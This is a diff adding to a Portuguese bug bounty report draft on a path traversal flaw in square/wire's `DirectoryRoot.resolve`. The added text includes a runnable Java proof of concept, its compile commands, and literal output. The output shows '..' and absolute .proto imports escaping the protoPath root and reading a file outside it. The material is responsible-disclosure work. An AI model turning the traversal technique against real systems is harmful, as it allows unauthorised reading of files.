@@ -13,6 +13,15 @@ enviar, confira:
 - [ ] Não é duplicata — checado contra relatórios já enviados por você
       a este programa
 
+**Estado no sistema: `scope_verified`** (grau de evidência E3 — reprodução
+determinística local real, ver seção de PoC abaixo). Checagem de
+duplicata feita contra advisories/issues públicos do `square/wire`
+(nenhum cobrindo este caminho específico — ver seção "Cadeia de chamada
+confirmada", item de atualização). **Confirme manualmente a elegibilidade
+de recompensa na página real do Bugcrowd antes de enviar** — o dataset
+usado pra escopo não expõe essa informação por ativo para este programa
+(confidence "low", diferente dos achados HackerOne).
+
 ---
 
 ## Título
@@ -207,6 +216,83 @@ terceiro (vendor, parceiro, pacote de schema compartilhado) cujo conteúdo
 não é fully trusted pelo time que roda o Wire — cenário coberto pelo
 próprio design do `protoPath` do Wire (compilar tipos que vêm de uma
 biblioteca `.proto` que você não escreveu).
+
+## Prova de conceito executável
+Programa Java mínimo usando o JAR real de `okio-jvm` 3.12.0 (baixado do
+Maven Central — não uma reimplementação, o mesmo bytecode de produção
+que `wire-schema` usa via sua dependência de `Path`/`FileSystem`),
+reproduzindo exatamente o mecanismo de `DirectoryRoot.resolve`: junta
+`rootDirectory` com o `import` via `Path.resolve(String)` (o método por
+trás do operador `/` do Okio, `normalize=false` por padrão) e faz a
+mesma checagem que o código real faz (`fileSystem.exists(resolved)`)
+antes de ler.
+
+```java
+import okio.Path;
+import java.io.File;
+import java.nio.file.Files;
+
+public class PathTraversalPoc {
+  public static void main(String[] args) throws Exception {
+    File tmp = Files.createTempDirectory("wire-poc-").toFile();
+    File safeRoot = new File(tmp, "protoPathRoot");
+    safeRoot.mkdirs();
+    File secretOutsideRoot = new File(tmp, "secret-outside-root.txt");
+    Files.writeString(secretOutsideRoot.toPath(), "SEGREDO_FORA_DA_RAIZ_PROTEGIDA");
+
+    Path rootDirectory = Path.Companion.get(safeRoot);
+
+    // Caso 1: import relativo com ".."
+    Path resolvedRelative = rootDirectory.resolve("../secret-outside-root.txt");
+    boolean exists = new File(resolvedRelative.toString()).exists();
+    String content = exists ? Files.readString(java.nio.file.Path.of(resolvedRelative.toString())) : null;
+
+    // Caso 2: import absoluto
+    Path resolvedAbsolute = rootDirectory.resolve(secretOutsideRoot.getAbsolutePath());
+    boolean absoluteEscaped = !resolvedAbsolute.toString().startsWith(safeRoot.getAbsolutePath());
+
+    // ver saída real completa abaixo
+  }
+}
+```
+
+Comando exato:
+```
+javac -cp "okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc.java
+java  -cp ".;okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc
+```
+
+Saída real (literal, JDK 21, 30/08/2026):
+```
+tmp dir: C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628
+safeRoot (raiz que deveria conter o import): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot
+secretOutsideRoot (arquivo FORA da raiz, nao deveria ser alcancavel): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt
+
+=== Caso 1: import relativo com ".." ===
+import (como apareceria no .proto): "../secret-outside-root.txt"
+rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot\..\secret-outside-root.txt  (string ainda contem ".." literal, normalize=false)
+fileSystem.exists(resolved) -- MESMA checagem que DirectoryRoot.resolve faz antes de ler: true
+Conteudo lido do arquivo (real, fora de safeRoot): SEGREDO_FORA_DA_RAIZ_PROTEGIDA
+ESCAPOU de verdade (leu o CONTEUDO do arquivo fora da raiz, nao so uma string parecida): true
+
+=== Caso 2: import absoluto ===
+import (como apareceria no .proto): "C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt"
+rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt
+ESCAPOU da raiz protegida (ignorou rootDirectory por completo): true
+
+=== RESULTADO ===
+PASS (comportamento perigoso REPRODUZIDO): okio.Path.resolve(String), sem normalize, permite path relativo com ".." E path absoluto escaparem de rootDirectory. DirectoryRoot.resolve do wire-schema so confere fileSystem.exists(resolved) antes de ler -- nenhuma checagem de que resolved continua dentro de rootDirectory.
+```
+
+**Nota sobre a string vs. a resolução real**: o `Path` resultante do caso
+1 ainda contém `..` de forma literal na representação em string (Okio
+não normaliza por padrão) — um `startsWith(rootDirectory)` ingênuo diria
+"não escapou". O sinal que importa de verdade é o mesmo que o próprio
+`DirectoryRoot.resolve` usa: `fileSystem.exists()`/leitura sobre esse
+`Path`, que aciona a resolução real do sistema operacional via
+`java.nio.file`, onde `..` sobe de diretório de fato — e foi isso que a
+PoC mediu (leu e comparou o conteúdo real do arquivo fora da raiz, não
+só a aparência da string).
 
 ## Correção sugerida
 Em `DirectoryRoot.resolve` (`Root.kt:129-137`), antes de aceitar
